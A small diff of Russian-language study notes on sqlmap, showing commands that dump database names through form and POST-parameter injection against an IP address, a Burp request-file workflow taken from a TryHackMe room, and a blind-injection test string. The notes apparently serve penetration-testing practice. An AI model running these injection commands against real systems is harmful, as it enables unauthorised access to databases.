@@ -7,7 +7,8 @@
 
 sqlmap -u <URL> --forms --batch --random-agent --dbs
 сканирование методом POST
-sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --dbs 
+sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --dbs --flush-session
+--flush-session     Flush session files for current target(сброс кеша)
 В Burp Copy to file запрос. в sqlmap -r файл с запросом -p параметр-уязвимый --затем опции. Пример с TryHackMe sqlmap -r req.txt -p blood_group --dbs.
 substring(database(),2,1)='B'
 https://tryhackme.com/room/sqlmap - пример использования с подгрузкой файла
